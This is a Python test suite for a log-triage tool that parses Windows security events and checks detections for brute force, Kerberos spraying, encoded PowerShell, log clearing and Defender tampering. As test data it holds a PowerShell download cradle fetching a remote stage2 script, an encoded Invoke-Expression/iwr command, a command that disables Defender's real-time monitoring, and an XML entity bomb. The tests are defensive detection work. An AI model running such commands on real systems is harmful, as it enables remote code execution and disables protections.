"""Windows event log ingestion and detections."""
import base64
import json
import os
from pathlib import Path

import pytest

from owltriage import windows
from owltriage.defense import plan_blocks
from owltriage.detectors import analyze
from owltriage.intel import BadIPList
from owltriage.sources import detect_format, iter_events

SAMPLES = Path(__file__).resolve().parent.parent / "owltriage" / "resources" / "samples"
WIN = SAMPLES / "windows_security.xml"


def rule_ids(result):
    return {f.rule_id for f in result.findings}


def test_sample_parses_into_typed_events():
    events = list(iter_events(WIN))
    assert len(events) == 17 and all(e.log_type == "windows" for e in events)
    kinds = [e.kind for e in events]
    assert kinds.count("auth_failure") == 7 and kinds.count("auth_success") == 2
    assert kinds.count("process") == 3 and kinds.count("network") == 1
    rdp = next(e for e in events if e.kind == "auth_failure")
    assert (rdp.ip, rdp.service, rdp.user) == ("198.51.100.77", "rdp", "administrator")
    cleared = events[-1]
    assert cleared.event_id == 1102 and cleared.fields["SubjectUserName"] == "administrator"


def test_windows_attack_story_is_detected():
    result = analyze([WIN], BadIPList.load(SAMPLES / "bad_ips.txt"))
    assert {"auth-brute-force", "auth-success-after-brute-force", "cmd-powershell-encoded",
            "cmd-powershell-download-cradle", "encoded-payload", "hidden-ip-in-payload", "blocklist-match",
            "cmd-inhibit-recovery", "win-account-created", "win-privileged-group-add",
            "win-service-suspicious-path", "win-log-cleared"} <= rule_ids(result)
    verdicts = {v["ip"]: v["verdict"] for v in result.ip_verdicts()}
    assert verdicts["10.0.0.25"] == "CLEAN"  # normal domain logon
    rules, _ = plan_blocks(result.findings)
    assert {(r.ip, r.direction) for r in rules} >= {("198.51.100.77", "inbound"), ("203.0.113.99", "outbound")}


def test_powershell_utf16_payload_is_decoded():
    result = analyze([WIN])
    cradle = next(f for f in result.findings if f.rule_id == "cmd-powershell-download-cradle")
    assert "DownloadString('http://203.0.113.99/stage2.ps1')" in cradle.detail


def test_utf16_export_from_powershell_redirection(tmp_path):
    utf16 = tmp_path / "security-utf16.xml"
    utf16.write_bytes(b"\xff\xfe" + ('<?xml version="1.0" encoding="UTF-16"?>\n' + WIN.read_text()).encode("utf-16-le"))
    assert detect_format(utf16) == "windows-xml"
    assert len(list(iter_events(utf16))) == 17


def test_xml_bomb_and_external_entities_are_refused(tmp_path):
    bomb = tmp_path / "bomb.xml"
    bomb.write_text('<!DOCTYPE x [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
                    "<Event><EventData><Data Name='x'>&b;</Data></EventData></Event>")
    result = analyze([bomb])
    assert result.lines_scanned == 0 and result.warnings  # refused, reported, no crash


def test_record_parser_refuses_entities_and_dtds():
    """.evtx records are parsed one by one with windows.fromstring, which must be defusedxml's."""
    with pytest.raises(ValueError):
        windows.fromstring('<!DOCTYPE x [<!ENTITY a "boom">]><Event>&a;</Event>')


def test_truncated_xml_keeps_parsed_events_and_warns(tmp_path):
    cut = tmp_path / "cut.xml"
    text = WIN.read_text()
    cut.write_text(text[: len(text) // 2])
    result = analyze([cut])
    assert 0 < result.lines_scanned < 17
    assert any("stopped after" in w for w in result.warnings)


def test_winlogbeat_ndjson_and_flat_json(tmp_path):
    lines = []
    for second in range(6):
        lines.append(json.dumps({"@timestamp": f"2026-11-09T04:00:0{second}Z", "winlog": {
            "event_id": 4625, "channel": "Security", "provider_name": "Microsoft-Windows-Security-Auditing",
            "event_data": {"TargetUserName": "svc", "IpAddress": "198.51.100.9", "LogonType": "3"}}}))
    lines.append(json.dumps({"EventID": 1102, "ProviderName": "Microsoft-Windows-Eventlog",
                             "SubjectUserName": "eve", "TimeCreated": "2026-11-09T04:01:00Z"}))
    lines.append("not json but has an ip 192.0.2.44")
    path = tmp_path / "events.ndjson"
    path.write_text("\n".join(lines) + "\n")
    assert detect_format(path) == "jsonl"
    result = analyze([path])
    assert {"auth-brute-force", "win-log-cleared"} <= rule_ids(result)
    assert "192.0.2.44" in result.ip_lines  # non-JSON line still parsed as text


def test_kerberos_spraying_and_success(tmp_path):
    def event(eid, user, status):
        return {"winlog": {"event_id": eid, "provider_name": "Microsoft-Windows-Security-Auditing",
                           "event_data": {"TargetUserName": user, "IpAddress": "::ffff:172.16.66.1",
                                          "Status": status}}, "@timestamp": "2026-11-09T04:00:00Z"}
    lines = [event(4768, f"user{i}", "0x6") for i in range(4)] + [event(4771, "admin", "0x18"),
                                                                  event(4768, "normal", "0x0")]
    path = tmp_path / "kerberos.json"
    path.write_text("\n".join(json.dumps(x) for x in lines))
    result = analyze([path])
    spray = next(f for f in result.findings if f.rule_id == "auth-brute-force")
    assert spray.title == "Kerberos password spraying" and spray.ip == "172.16.66.1"
    assert "auth-success-after-brute-force" in rule_ids(result)


def test_powershell_scriptblock_4104_feeds_command_rules(tmp_path):
    record = {"winlog": {"event_id": 4104, "provider_name": "Microsoft-Windows-PowerShell",
                         "event_data": {"ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true"}}}
    path = tmp_path / "ps.json"
    path.write_text(json.dumps(record))
    assert "cmd-defender-tampering" in rule_ids(analyze([path]))


def test_evtx_without_optional_package_gives_install_hint(tmp_path, monkeypatch):
    import builtins
    fake = tmp_path / "Security.evtx"
    fake.write_bytes(b"ElfFile\x00" + b"\x00" * 100)
    real_import = builtins.__import__

    def no_evtx(name, *args, **kwargs):
        if name == "evtx":
            raise ImportError("no evtx")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", no_evtx)
    result = analyze([fake])
    assert any("pip install 'owltriage[evtx]'" in w for w in result.warnings)


def test_corrupt_evtx_is_a_warning():
    pytest.importorskip("evtx")
    import tempfile
    with tempfile.NamedTemporaryFile(suffix=".evtx", delete=False) as handle:
        handle.write(b"ElfFile\x00" + os.urandom(4096))
    try:
        result = analyze([handle.name])
        assert result.warnings and result.lines_scanned == 0
    finally:
        os.unlink(handle.name)


def test_record_from_json_rejects_non_windows():
    assert windows.record_from_json({"hello": "world"}) is None
    assert windows.record_from_json(["list"]) is None
    assert windows.record_from_json({"EventID": {"#text": "4720"}})["event_id"] == 4720


def test_encoded_command_detection_on_utf16():
    encoded = base64.b64encode("Invoke-Expression (iwr http://x/y.ps1)".encode("utf-16-le")).decode()
    from owltriage.detectors import decode_base64_blobs
    [(token, decoded)] = decode_base64_blobs(f"powershell -enc {encoded}")
    assert decoded.startswith("Invoke-Expression")
